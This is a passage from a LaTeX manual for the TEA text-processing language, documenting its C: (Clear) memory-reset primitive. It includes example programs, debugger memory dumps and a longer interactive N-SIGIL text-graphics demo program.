	\makecell{Associated\\TEA} & \texttt{i:\{...\}} & \texttt{d!:[0-9]}	& \texttt{b!:} & \texttt{m!:} & \texttt{z:\{AI...\}}\\
	\hline
	\hline	
	1&$\langle 63 285 02517 abc3921 219e \rangle$ & $\langle 63 285 02517 abc3921 219e \rangle$ & 012356789 & 987653210 & 1\\
	\hline
	2&$\langle 63 25 02517 \rangle$ & $\langle 632502517 \rangle$  & 0123567 & 7653210 & 2\\
	\hline
	3&$\langle 1998 1994 1984 1001 \rangle$ & $\langle 1998199419841001 \rangle$ & 01489 & 98410  & 4\\
	\hline
	4&$\langle 124 999 452 111 98 ae this is 9519 \rangle$ & $\langle 124999452111989519 \rangle$ & 124589  & 985421 & 3\\
	\hline	              
\end{tabular}
  \caption{Tabular Analysis to identify $S_m$ given a collection of arbitrary alpha-numeric sequences}
    \label{TABANAB1}
\end{table}


From the analysis we have conducted in \textbf{\autoref{TABANAB1}}, and which is based on computations we conduct on the input/presented data --- alpha-numeric sequences $S_{i\in [1,n]}$, as depicted in the TEA program (see  \textbf{\autoref{FIGB5}}), we find that the solution to our problem then, shall be the sequence:

\begin{equation}
\label{EQB1}
S_1 = \langle 63 285 02517 abc3921 219e \rangle
\end{equation}

And how did we know or how might we prove this? Or rather, how did we arrive at the final results in the \textbf{RANK} column? Without evolving the original program further, note that, once we have the $P_{S_i}$ values ($5^{th}$ column), we then can sort them --- not lexically as usual TEA might allow, but numerically, and with use of some little \textit{external power} as we shall see when we come to the TEA primitive \textbf{Z:}:



 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: sort in descending order numbers from input sequence]
  %\begin{lstlisting}[language=TEA, caption={TP B6}, label={LSTB6}, numbers=left]
  \begin{lstlisting}[language=TEA]
i:{987653210 7653210 98410 985421} 
r!:[ ]+:,
x:[
x!:]
z:{JSON.parse(AI).map(s=>Number(s)).sort((a,b)=>b-a)}
h!:,
d:,
   \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA EXAMPLE: Numerically Sorting Words/Values/Numbers in WEB TEA}
  \label{FIGB6}
\end{figure}


And when we run that program depicted in \textbf{\autoref{FIGB6}}, we obtain the following output:


\begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=TEA Output from \textbf{\autoref{FIGB6}}]
  \begin{lstlisting}
987653210
7653210
985421
98410
  \end{lstlisting}
  \end{tcolorbox}
  \caption{Result of numerically sorting numeric projections}
\end{figure}

Which then gives us the rankings, and from that we determine the solution to our original problem. Thus we conclude our treatment of \textbf{B:} for now.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: C
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{C: CLEAR}
\label{CHAPC}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & \texttt{Clear}\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Clear working memory
	\item Reset all vaults (TEA variables in memory)
	\item Reset particular/named vaults
	\item Reset AI
	\item Guarantee subsequent instructions set memory independently of earlier instructions
	\item Automagically create and initialize named vaults with the EMPTY STRING value.
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of TEA Primitive \textbf{C:}}
  \label{TABTAZC}
\end{table}


\section{SEMANTICS of C:}
\label{SECSEMC}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

c: & Set Empty String as IO/AI \\

\rowcolor{lightgray}\bfseries c:PARAMS & INERT \\

 c!: & Set Empty String as IO and set to Empty String all 
currently active vaults (including the DEFAULT VAULT)\\
 
\rowcolor{lightgray}\bfseries c!:PARAMS & INERT\\

 c*: & INERT\\
 
 \rowcolor{lightgray}\bfseries \makecell[l]{c*:v1:v2:…:vN \\ c*!:v1:v2:…:vN}& \textbf{ONLY} clear/reset the vaults specified by the given vault names v1, v2,…, vN. Does NOT tamper with IO/AI. \textbf{INCASE} any of the specified vault names points to a vault that does not yet exist, then it shall be created, and automatically initialized with the EMPTY STRING.\\
 
 \hline
\end{tabular}
\caption{The Semantics of C:}
\label{TABSEMC}
\end{table}


\section{NOTES about C:}
\label{SECNOTESC}

For especially purposes of \textbf{C:}, note that the \textbf{Empty String} is the sequence “” --- essentially, a string of 0 length, and that, by setting some vault or variable to that value, we effectively deem it ``reset" or ``cleared". The \textbf{C:} commands DO NOT declare nor [re-]write new or previously undeclared memory spaces --- vaults to be precise, but rather, modify existing, named (and in the case of \texttt{c:}, also the \texttt{DEFAULT/UNNAMED VAULT}\footnote{In TEA parlance, the ``Unnamed" or ``Default Vault" does come up several times as you shall see when exploring the TAZ, and it plays a very crucial role in TEA programming as we shall also come to learn. But essentially, it is a vault whose name is just the EMPTY STRING, ``". Typically, only special instructions can create such a vault, and users of vault-creating primitives such as \texttt{v:vNAME} can not directly create or write to it using an empty name. More about this later.}\footnote{Talking of globally resetting working memory in a TEA program, using say \texttt{c!:}, it shall be useful or rather important to note that, there is JUST ONE variable that no \textbf{C:} command can clear or reset, and that is the \textbf{Initial AI} --- the external, user-provided input at the start of a TEA program is always, and shall always (if it was indeed provided), remain accessible via a special TEA instruction known as \textbf{Yank}; particularly, the instruction \texttt{y*:}, which we shall formally cover in the chapter on \textbf{Y:}.}


With that introduction and the formal specifications of \textbf{C:} out of the way, the program:


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: resetting explicitly set AI]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C1}, label={LSTC1}, numbers=left]
i!:{BC}| c:
# (=, VAULTS:{})
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC1}
\end{figure}

Despite having an explicit, hard-coded input specified in the first instruction of the program as ``BC", shall, and should return just ``" as expected. While  


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: \texttt{c:} does not clear DEFAULT VAULT]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C2}, label={LSTC2}, numbers=left]
i!:{BC} | v: | c: | y:
# (=BC, VAULTS:{"":"BC"})
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC2}
\end{figure}

Should return ``BC". The main difference between those two programs --- which actually initialize their initial input/AI in the same exact way, is that, for the case in \textbf{\autoref{LSTC1}}, \texttt{c:} is invoked before any chance is given to stash the AI somewhere for later use, while, as we see in \textbf{\autoref{LSTC2}}, we first store the input into some memory location --- with \texttt{v:} in this case, which, as we shall see in the section on \textbf{V:}, writes AI to the \textbf{DEFAULT VAULT}, so that, by the time we call \texttt{c:}, which ONLY resets AI, we have that value still accessible later, when we invoke the vault-reading instruction \texttt{y:}\footnote{Concerning this example, note that indeed, as shown in the commented out line, which dumps the state of the TEA runtime at the moment the program exits, we see that indeed, the Default Vault held the stashed value of the original AI so that we can still be able to later read it unless say \texttt{c!:} had been invoked somewhere before termination of the program.}.

However, in the next example:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: \texttt{c!:} resets all memory]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C3}, label={LSTC3}, numbers=left]
i!:{BC} | v: | v:XX:{T} | c!: | y:XX
# (=, VAULTS:{"":"","XX":""})
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC3}
\end{figure}


We note that we shall still end up with the result ``" because whether or not we read the main/implicit memory (AI) or any explicit/named memory (such as the default vault via \texttt{y:} or the ``XX” vault written to in this example program, and which we later read using \texttt{y:XX}), after a call to c!:, all active memory is essentially cleared --- as seen in the dump of the final runtime state in the last comment of \textbf{\autoref{LSTC3}}.


For cases where one wishes to clear only specific sections of memory, via named vaults, the following example can be illustrative enough:

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: \texttt{c!:} resets all memory]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C4}, label={LSTC4}, numbers=left]
i!:{BC} | v: | c: | y: | a!: |
v:vA | n:100 | v:vB | v:vGLUE:** 
| c*!:vA | g*!:vGLUE:vA:vB
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC4}
\end{figure}

That program should return ``**N" where N is some random number (e.g ``BC**98"). Otherwise, without \texttt{c*!:vA}, such as in the following version:

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: \texttt{c!:} resets all memory]
    %\begin{lstlisting}[language=TEA]
  \begin{lstlisting}[language=TEA, caption={TP C5}, label={LSTC5}, numbers=left]
i!:{BC} | v: | c: | y: | a!: | 
v:vA | n:100 | v:vB | v:vGLUE:** 
| g*!:vGLUE:vA:vB
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC4}
\end{figure}

 
 should return something like ``CB**N" or ``BC**N" (e.g ``CB**42") because nothing reset or cleared the associated memory space, \texttt{vA}. 
 
 One would get an appreciation of how these commands work, by inspecting the resultant system state at the end of running that earlier program in \textbf{\autoref{LSTC4}} as shown in the following TEA Debugger output and memory dump associated with running that program\footnote{Shown here in two separate screenshots, because of the length of the total output.} Vs running the second/modifed program in \textbf{\autoref{LSTC5}}.
 
 
 \begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=Truncated TEA Debugger Output from executing \textbf{\autoref{LSTC4}}]
  \begin{lstlisting}
No explicit INPUT found
INPUT:
 
CODE:
 i!:{BC} | v: | c: | y: | a!: |
v:vA | n:100 | v:vB | v:vGLUE:** 
| c*!:vA | g*!:vGLUE:vA:vB
---------[ IN TEA RUNTIME ]

+++[NO TEA CODE ERRORS FOUND YET]
#13 of ["i!:{BC} "," v: "," c: "," y: "," a!: ","","v:vA "," n:100 "," v:vB "," v:vGLUE:** ",""," c*!:vA "," g*!:vGLUE:vA:vB"]
CLEAN TEA CODE TO PROCESS:
i!:{BC} 
v: 
c: 
.
.
.
--[#11 TEA INSTRUCTIONS FOUND]---
...
Processing Instruction: c: 
PRIOR MEMORY STATE: (=BC, VAULTS:{"":"BC"})
RESULTANT MEMORY STATE: (=, VAULTS:{"":"BC"})
Executing Instruction#3 (out of 11)
Processing Instruction: y: 
PRIOR MEMORY STATE: (=, VAULTS:{"":"BC"})
+++[WARNING] INSTRUCTION WITH NO DATA TO PROCESS FOUND: y: 
--[INFO] Reading VAULT[]
[INFO] Returning string  in DEFAULT VAULT [BC]
RESULTANT MEMORY STATE: (=BC, VAULTS:{"":"BC"})
Executing Instruction#4 (out of 11)
Processing Instruction: a!: 
PRIOR MEMORY STATE: (=BC, VAULTS:{"":"BC"})
RESULTANT MEMORY STATE: (=CB, VAULTS:{"":"BC"})
Executing Instruction#5 (out of 11)
Processing Instruction: v:vA 
PRIOR MEMORY STATE: (=CB, VAULTS:{"":"BC"})
--[INFO] Wrote VAULT[vA = [CB]]
RESULTANT MEMORY STATE: (=CB, VAULTS:{"":"BC","vA":"CB"})
Executing Instruction#6 (out of 11)
Processing Instruction: n:100 
PRIOR MEMORY STATE: (=CB, VAULTS:{"":"BC","vA":"CB"})
RESULTANT MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"CB"})
... 
PRIOR MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"CB","vB":"95"})
--[INFO] Wrote VAULT[vGLUE = [**]]
RESULTANT MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"CB","vB":"95","vGLUE":"**"})
Executing Instruction#9 (out of 11)
Processing Instruction: c*!:vA 
PRIOR MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"CB","vB":"95","vGLUE":"**"})
RESULTANT MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"","vB":"95","vGLUE":"**"})
Executing Instruction#10 (out of 11)
Processing Instruction: g*!:vGLUE:vA:vB
PRIOR MEMORY STATE: (=95, VAULTS:{"":"BC","vA":"","vB":"95","vGLUE":"**"})
--[INFO] Reading VAULT[vGLUE]
--[INFO] Reading VAULT[vA]
--[INFO] Reading VAULT[vB]
RESULTANT MEMORY STATE: (=**95, VAULTS:{"":"BC","vA":"","vB":"95","vGLUE":"**"})
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA Debugger Output for Understanding Memory Alteration via \texttt{c*!:vA}}
  \label{FIGC5}
\end{figure}


\begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=Truncated TEA Debugger Output from executing \textbf{\autoref{LSTC5}}]
  \begin{lstlisting}
...
---------[ IN TEA RUNTIME ]

+++[NO TEA CODE ERRORS FOUND YET]
#12 of ["i!:{BC} "," v: "," c: "," y: "," a!: "," ","v:vA "," n:100 "," v:vB "," v:vGLUE:** ",""," g*!:vGLUE:vA:vB"]
CLEAN TEA CODE TO PROCESS:
i!:{BC} 
v: 
c: 
y: 
a!: 
v:vA 
n:100 
v:vB 
v:vGLUE:** 
g*!:vGLUE:vA:vB
--[#10 TEA INSTRUCTIONS FOUND]---
...
Processing Instruction: y: 
PRIOR MEMORY STATE: (=, VAULTS:{"":"BC"})
+++[WARNING] INSTRUCTION WITH NO DATA TO PROCESS FOUND: y: 
--[INFO] Reading VAULT[]
[INFO] Returning string  in DEFAULT VAULT [BC]
RESULTANT MEMORY STATE: (=BC, VAULTS:{"":"BC"})
Executing Instruction#4 (out of 10)
Processing Instruction: a!: 
PRIOR MEMORY STATE: (=BC, VAULTS:{"":"BC"})
RESULTANT MEMORY STATE: (=CB, VAULTS:{"":"BC"})
Executing Instruction#5 (out of 10)
Processing Instruction: v:vA 
PRIOR MEMORY STATE: (=CB, VAULTS:{"":"BC"})
--[INFO] Wrote VAULT[vA = [CB]]
RESULTANT MEMORY STATE: (=CB, VAULTS:{"":"BC","vA":"CB"})
Executing Instruction#6 (out of 10)
Processing Instruction: n:100 
PRIOR MEMORY STATE: (=CB, VAULTS:{"":"BC","vA":"CB"})
RESULTANT MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB"})
Executing Instruction#7 (out of 10)
Processing Instruction: v:vB 
PRIOR MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB"})
--[INFO] Wrote VAULT[vB = [81]]
RESULTANT MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB","vB":"81"})
Executing Instruction#8 (out of 10)
Processing Instruction: v:vGLUE:** 
PRIOR MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB","vB":"81"})
--[INFO] Wrote VAULT[vGLUE = [**]]
RESULTANT MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB","vB":"81","vGLUE":"**"})
Executing Instruction#9 (out of 10)
Processing Instruction: g*!:vGLUE:vA:vB
PRIOR MEMORY STATE: (=81, VAULTS:{"":"BC","vA":"CB","vB":"81","vGLUE":"**"})
--[INFO] Reading VAULT[vGLUE]
--[INFO] Reading VAULT[vA]
--[INFO] Reading VAULT[vB]
RESULTANT MEMORY STATE: (=CB**81, VAULTS:{"":"BC","vA":"CB","vB":"81","vGLUE":"**"})
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA Debugger Output for Understanding Memory Alteration via C:}
  \label{FIGC6}
\end{figure}

Before we close the discussion about \texttt{C:}, note that, if the vault-manipulating variants of the \textbf{CLEAR} TEA primitve are invoked with names to vaults that don't yet exist, then they shall automatically create those vaults without complaining, and initialize them to ``". 

An illustration of this effect is demonstrated when we invoke the program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: explore selective processing of vaults by c*]
  %\begin{lstlisting}[language=TEA, caption={TP C6}, label={LSTC6}, numbers=left]
    \begin{lstlisting}[language=TEA]
v:vC:TEST|v:vF:TEST-F|c*!:vC:vD
   \end{lstlisting}
  \end{tcolorbox}
  %\caption{Sample TEA Program demonstrating most quirks of TEA programming (MINIFIED version)}
  %\label{FIGC6}
\end{figure}


On the TEA commandline as shown in the following screenshot:

\begin{figure}[H]
  \centering
  \begin{tcolorbox}[myterminalstyle, title=Selective Processing of Vaults by \texttt{C*:} and \texttt{C*!:}]
  \begin{lstlisting}
EXPERIMENTS|< 15:22:41 $>* tttt -c "v:vC:TEST|v:vF:TEST-F|c*!:vC:vD" -d
No explicit INPUT found, using STDIN!
INPUT:
 None
CODE:
 v:vC:TEST|v:vF:TEST-F|c*!:vC:vD
---------[ IN TEA RUNTIME ]

+++[NO TEA CODE ERRORS FOUND YET]
CLEAN TEA CODE TO PROCESS:
v:vC:TEST
v:vF:TEST-F
c*!:vC:vD
--[#3 TEA INSTRUCTIONS FOUND]---

---<< EXTRACTED TEA LABEL BLOCKS:
{}

Executing Instruction#0 (out of 3)
Processing Instruction: v:vC:TEST
PRIOR MEMORY STATE: (=, VAULTS:{})
-- [INFO] Wrote VAULT[vC = [TEST]]
RESULTANT MEMORY STATE: (=, VAULTS:{'vC': 'TEST'})
Executing Instruction#1 (out of 3)
Processing Instruction: v:vF:TEST-F
PRIOR MEMORY STATE: (=, VAULTS:{'vC': 'TEST'})
-- [INFO] Wrote VAULT[vF = [TEST-F]]
RESULTANT MEMORY STATE: (=, VAULTS:{'vC': 'TEST', 'vF': 'TEST-F'})
Executing Instruction#2 (out of 3)
Processing Instruction: c*!:vC:vD
PRIOR MEMORY STATE: (=, VAULTS:{'vC': 'TEST', 'vF': 'TEST-F'})
RESULTANT MEMORY STATE: (=, VAULTS:{'vC': '', 'vF': 'TEST-F', 'vD': ''})
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA Debugger Output for Understanding Selective Processing of Vaults by \texttt{C*:} and \texttt{C*!:}}
  \label{FIGC7}
\end{figure}


\section{EXAMPLE APPLICATIONS of C:}
\label{SECEXAMPC}

\texttt{C:} is mostly about clearing or rather, managing memory. Quite an important facility for those who recall the ancient days of programming in languages such as C and C++, that not only made available the nifty and useful, but also painful facility of pointers and manual memory management! Luckily, in TEA, the programmer need not worry much about manual management of memory --- particularly, with regards to correctly creating, initializing and clearing or especially disposing of/returning memory to the system, because much of it is already catered for by the TEA runtime, and no possibility for example, exists, for a TEA program to directly or readily write uninitialized memory, nor for the program to quit without correctly returning memory to the underlying system.

However, that said, and given the only way to use memory with references or pointers is via TEA Vaults, we then shall acknowledge and appreciate, that, with proper use of the basic facility to create, set, update and clear memory\footnote{\textbf{WARNING:} note that, currently (as of \textbf{TEA v1.1.0} --- see \url{https://tea.nuchwezi.com} for latest), TEA provides no direct means to delete entirely or rather, to unregister a previously named memory pointer/variable reference such as with vault names, other than merely clearing the referenced memory space (such as by setting it to the EMPTY SPACE). But if required, perhaps future TEA versions might avail this functionality as a subset of \textbf{C*:} or \textbf{C.:} command space.}, the software programmer can design or implement many useful and efficient computer programs that might leverage logic that relies on the state of the program's memory so as to perform correctly. The following non-trivial, but still basic program, is a great illustration of such a computer program.


\subsection{EXAMPLE 1: \textbf{DATA ENCODING:} The N-SIGIL Generator: print textual-qrcode corresponding to some number N}
\label{SECEXAMP1C}

This program we are going to look at next, is mostly classified as both a graphical and interactive game-like software that can correctly work as written, for particularly WEB TEA\footnote{As we have indicated in \textbf{\autoref{SEC1}}, programs leveraging the \texttt{Z:CMD} instructions might not be readily portable across just WEB and CLI TEA.} --- access to which is currently readily possible via the \textbf{TEA WEB Integrated Development Environment}: \url{https://tea.nuchwezi.com}.

The program was originally developed to be part of the standard demonstration programs for the WEB TEA suite, and at basic, it does the following:

\begin{enumerate}
\item Given some numeric input, $n$, that lies within some pre-configured range: $1 \leq n \leq (nCols \times nRows)$, shall proceed to process that user-provided response, $n$, so that it then prints a matrix of $(nCols \times nRows)$ on the screen, and inside which it plots and prints a specific and deterministic basic diagram mapping the specified argument to some finite number of ``graphical bits" that unlike the rest of the matrix or grid, are \textbf{ON}, while the rest are \textbf{OFF}.
\item Essentially, it prints a ``sigil" or rather a kind of ``QRCode" or primitive ``Barcode" that can uniquely distinguish the provided number argument from any other\footnote{No, currently, it is not guaranteed to always return a universally distinct sigil for any real number, given some  numbers might result in a projection that is shared by other numbers too, but, for a particular set of $(nCols \times nRows)$, any particular $n$ is guaranteed to result in the same projection or picture across invocations of the same program or algorithm.}.
\item After prompting for and displaying the image corresponding to a user provided response, the program first clears the core graphics memmory previously utilized, via leveraging the TEA \texttt{c*:vNAME} instructions, and then re-iterates, prompting the user for the next number to visualize.
\item It is written to be intelligent enough despite its text-only user-interface, so that, once the user feels like quitting or stopping, they can just respond with the \textbf{STOP}-command; ``end", and then the program shall quit.
\end{enumerate}

In a somewhat verbose style --- so that TEA-newcomers might also get the chance to see what non-trivial TEA programming is like, as well as learn some useful quirks of how to jaggle things in TEA, we shall intermix code and comments, as well as mostly use the unminified style of TEA source.


 %\begin{figure}[H]
 {
 \small
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: N-SIGIL image generator program, breakable]
  %\begin{lstlisting}[language=TEA, caption={TP C7}, label={LSTC7}, numbers=left]
  \begin{lstlisting}[language=TEA,breaklines=true]
#~~[WELCOME to N-SIGIL v1.0.0]
#~~[not for the faint of heart]
#--|original algorithm by fut.prof. JWL
#--|WARNING: this TEA program is meant to 
#--|work as currently implemented
#--|ONLY for WEB TEA such as: 
#--| https://tea.nuchwezi.com
#----------------------------------------------------|

#BEGIN: determine what our image dimensions 
# shall be (not user-set)
v:vCOL:10 #columns e.g 5
v:vROW:6 #rows e.g 4
g*:*:vCOL:vROW | v:vN | z*:vN | v:vN #cardinality of grid (=20)

l:lSTART
#first, CLEAR/INIT key vaults:
c*!:vA:vAA:vB:vC:vD:vE:vF

i!:{=======[WELCOME to N-SIGILS]======
N-SIGILS v.1.0.0 is written in TEA v.1.1.0, 
and is an experiment to do basic graphics 
in TEA using text-processing. It is entertaining,
and will help you draw a basic QR-CODE sigil
for any number you specify. It is also interactive;
At any moment, you can quit if you like.
=============================}|i: #instructions

i!:{Preferably, pick a number between 1 and } 
| x*!:vN | x!:{ }|x!: (or `end' to QUIT): | v:vPROMPT
i: #prompt
v:vRESPONSE # stash user response
#store marshalled answer (e.g vANS=8)
z:{Math.abs(Number(AI))||1} | v:vANS 

#otherwise, first confirm if we got a legit number
y:vRESPONSE # retrieve user response
z:{Number(AI)} 
f!:NaN:lPROCESS_BLANK
j:lERRORNaN 

#check we are processing a blank number
l:lPROCESS_BLANK
y:vRESPONSE
f!:^$:lPROCESS
j:lERRORNaN

#continue to process
l:lPROCESS

y:vANS #retrieve number we saved

#compute vA
#adjust as: ((n)=>Math.floor(n/vN) + (n%vN))(vA)
v:vEXP1:((n)=>Math.floor(n/|
v:vEXP2:) + (n%|v:vEXP3:))(|v:vEXP4:)
v:vA | g*:{}:vEXP1:vN:vEXP2:vN:vEXP3:vA:vEXP4 |
v:vCMDA|z*:vCMDA|v:vA #vA=8

#compute vAA
#adjust as: ((n)=>(Math.floor(n/vCOL) + (n%vCOL))%vCOL)(vA)
v:vEXP1:((n)=>(Math.floor(n/|v:vEXP2:) + (n%|
v:vEXP3:))%|v:vEXP4:)(|v:vEXP5:)
| g*:{}:vEXP1:vCOL:vEXP2:vCOL:vEXP3:vCOL:vEXP4:vA:vEXP5 
|v:vCMDAA|z*:vCMDAA|v:vAA #vAA=4
 
#vA -> compute vB: ((n)=>(vN + n)%vCOL)(vA)
v:vEXP1:((n)=>(|v:vEXP2: + n)%|v:vEXP3:)(|v:vEXP4:)
g*:{}:vEXP1:vN:vEXP2:vCOL:vEXP3:vA:vEXP4 |v:vCMDB|
z*:vCMDB|v:vB #vB=3

#vB -> compute vC: ((n)=>Math.abs(vN - n)%vCOL)(vB)
v:vEXP1:((n)=>Math.abs(|v:vEXP2: - n)%|v:vEXP3:)(|v:vEXP4:)
g*:{}:vEXP1:vN:vEXP2:vCOL:vEXP3:vB:vEXP4 |v:vCMDC|
z*:vCMDC|v:vC #vC=2

#vC -> compute vD: 
#((n)=>Math.floor((n*vN*0.5)/vROW) + Math.floor((n*vN*0.5)%vROW))(vC)
v:vEXP1:((n)=>Math.floor((n*|v:vEXP2:*0.5)/|
v:vEXP3:) + Math.floor((n*|v:vEXP4:*0.5)%|v:vEXP5:))(|v:vEXP6:)
g*:{}:vEXP1:vN:vEXP2:vROW:vEXP3:vN:vEXP4:vROW:vEXP5:vC:vEXP6 |
v:vCMDD|z*:vCMDD|v:vD #vD=5

#vD -> compute vE: 
#((n)=>Math.floor(Math.abs(n - vN*0.5)/vROW) 
#+ Math.floor(Math.abs(n - vN*0.5)%vROW))(vD)
v:vEXP1:((n)=>Math.floor(Math.abs(n - |v:vEXP2:*0.5)/|
v:vEXP3:) + Math.floor(Math.abs(n - |v:vEXP4:*0.5)%|v:vEXP5:))(|v:vEXP6:)
g*:{}:vEXP1:vN:vEXP2:vROW:vEXP3:vN:vEXP4:vROW:vEXP5:vD:vEXP6 
|v:vCMDE|z*:vCMDE|v:vE #vE=2

#vD -> compute vF: 
#((n)=>Math.floor(Math.abs(n*0.5)/vCOL) + Math.floor(Math.abs(n*0.5)%vCOL))(vN)
v:vEXP1:((n)=>Math.floor(Math.abs(n*0.5)/|
v:vEXP2:) + Math.floor(Math.abs(n*0.5)%|v:vEXP3:))(|v:vEXP4:)
g*:{}:vEXP1:vCOL:vEXP2:vCOL:vEXP3:vN:vEXP4 |
v:vCMDF|z*:vCMDF|v:vF #vF=5

#DEBUG: show which coordinates to shade
#1: vA -> (1,vAA) -> (1,4)
#2: vB -> (2,vB) -> (2,3)
#3: vC -> (3,vC) -> (3,2)
#5: vD -> (4,vD) -> (4,5)
#6: vE -> (vF, vE) -> (5,2)

#Given vCOL x vROW -> (5x4) and <(x,y)*> simulate...
###X#
##X##
#X###
#X###

#----[presenting results]-------
l:RESULT

#first, construct the specification for the grid to print
#vCOORDINATES=[(1,vAA), (2,vB), (3,vC), (4,vD),(vF, vE)]
#v:vEXP1:[(1,|v:vEXP2:), (2,|v:vEXP3:), (3,|v:vEXP4:), (4,|v:vEXP5:),(|v:vEXP6:, |v:vEXP7:)]
#G*:{}:vEXP1:vAA:vEXP2:vB:vEXP3:vC:vEXP4:vD:vEXP5:vF:vEXP6:vE:vEXP7 | 

#v1.0.1: this improvement uses the same coordinates in (x,y) and (y,x) for a richer plot
v:vEXP1:[(1,|v:vEXP2:), (2,|v:vEXP3:), (3,|v:vEXP4:), (4,|v:vEXP5:),(|v:vEXP6:,|v:vEXP7:),|G*:{}:vEXP1:vAA:vEXP2:vB:vEXP3:vC:vEXP4:vD:vEXP5:vF:vEXP6:vE:vEXP7|v:vSLICE1|v:vEXP1:(|v:vEXP2:,1), (|v:vEXP3:,2), (|v:vEXP4:,3), (|v:vEXP5:,4),(|v:vEXP6:,|v:vEXP7:)]|G*:{}:vEXP1:vAA:vEXP2:vB:vEXP3:vC:vEXP4:vD:vEXP5:vE:vEXP6:vF:vEXP7|v:vSLICE2|G*:{}:vSLICE1:vSLICE2

v:vCMDCOORDINATES
#orig: [(1,4), (2,3), (3,2), (4,5),(5,2)]
#v1.0.1: [(1,8), (2,8), (3,2), (4,10),(3,5),(8,1), (8,2), (2,3), (10,4),(5,3)]
G*:{,}:vCOL:vROW:vCMDCOORDINATES | v:vCMD_GRIDSPEC

#now print...
y:vCMD_GRIDSPEC #2,4,[(1,4), (2,3), (3,2), (4,5),(5,2)]

v:vCMD_PRINT:{((AI)=>{let[c,r,s]=AI.match(/^(\d+),(\d+),\[(.*)\]$/).slice(1),C=s.match(/\((\d+),(\d+)\)/g).map(p=>p.match(/\((\d+),(\d+)\)/).slice(1).map(Number)),g=Array.from({length:+r},()=>Array(+c).fill("#"));C.forEach(([x,y])=>{if(y>=1&&y<=r&&x>=1&&x<=c)g[y-1][x-1]="X"});return g.map(e=>e.join("")).join("\n")})(AI);}
z*:vCMD_PRINT | v:vRESULT

i!:{__That is your N-SIGIL for }|x*!:vRESPONSE|v:vMSG|g*:{}:vRESULT:vMSG|h!:_|d:_
i: #present

#q!: don't auto-quit..
j:lSTART #loop

l:lERRORNaN #incase response was wrong
y:vRESPONSE | f:end:lSTOP
i!:{Value picked was wrong. Try Again}|i: |j:lSTART #report error, loop

l:lSTOP #closing remarks
i!:{===[Thanks for enjoying the N-SIGIL game and utility]===
 See u n:ext time!} | i: | i!:---[N-SIGIL v1.0.0 QUIT SUCCESSFULLY]--- | -#cheerio
   \end{lstlisting}
  \end{tcolorbox}
  \captionof{figure}{TEA EXAMPLE: \textbf{N-SIGIL} Text-based Unique-Image Generator TEA Game}
  \label{FIGC7}
  %\caption{TEA EXAMPLE: \textbf{N-SIGIL} Text-based Unique-Image Generator TEA Game}
  \vspace{1cm}
  
}
 %\centering  
 \raggedright %force normal/left-alignment  
  
  As it is, the TEA program in \textbf{\autoref{FIGC7}} consists of a total of \textbf{136} TEA instructions, spans features such as:
  
\begin{enumerate}
\item Dynamic greeting prompts.
\item Conditional branching logic.
\item Unconventional loops via TEA labels and label-blocks with \texttt{L:}, \texttt{F:} and \texttt{J:} instructions.
\item Conditional program quitting.
\item Text-based graphics.
